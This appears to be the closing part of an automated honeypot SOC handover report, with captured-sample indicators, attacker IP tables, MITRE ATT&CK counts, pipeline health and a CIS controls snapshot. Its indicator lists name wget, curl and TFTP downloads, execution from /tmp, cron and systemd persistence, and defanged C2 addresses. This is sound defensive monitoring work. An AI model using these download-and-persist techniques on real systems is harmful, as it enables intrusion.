| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `77.239.124[.]130` | NL | ROCKET & MARINICA LTD | **100** ⚠️ | 50 |
| `220.120.83[.]75` | KR | Korea Telecom | **100** ⚠️ | 9 |
| `45.33.109[.]18` | US | Linode | **100** ⚠️ | 50 |
| `66.132.195[.]46` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `172.104.210[.]105` | US | Linode | **100** ⚠️ | 50 |
| `87.236.176[.]132` | GB | Driftnet Ltd | **100** ⚠️ | 50 |
| `109.160.32[.]117` | NL | Global Communication Net Plc | **100** ⚠️ | 22 |
| `130.12.180[.]32` | DE | Virtualine Technologies | **100** ⚠️ | 19 |
| `159.112.138[.]47` | CL | Oracle Corporation | **100** ⚠️ | 48 |
| `3.14.73[.]254` | US | Amazon Technologies Inc. | **100** ⚠️ | 42 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 209 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 157 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 53 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 48 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 10 |

---

## 🔕 False Positive Summary (54 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 18 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 3 |
| AbuseIPDB score 22 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 25 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 371 cases |
| Tool 34  | Credential Extractor        | ✅ 4427 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 28 fingerprints |
| Tool 36  | Command Clustering          | ✅ 23 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 241 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 54 filtered (14.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 117 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 30 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 155 priority case(s) shown individually · 149 recon entry/entries in table (9 group(s) consolidating 22 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-11T16:58:33Z_
